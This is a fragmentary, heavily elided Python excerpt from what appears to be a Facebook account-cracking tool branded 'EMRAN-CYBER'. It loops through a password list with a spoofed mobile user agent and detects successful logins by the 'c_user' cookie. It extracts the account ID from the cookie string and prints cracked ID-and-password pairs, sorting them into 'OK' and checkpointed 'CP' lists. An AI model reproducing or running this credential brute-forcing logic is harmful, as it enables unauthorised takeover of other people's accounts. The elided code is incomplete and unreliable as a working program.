...
for x in range(10):
    ...
    l='Mobile WVGA SMM-EMRAN-CYBER/1.2.0 OPN-B'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[EMRAN-CYBER😻-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mEMRAN-CYBER😿-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
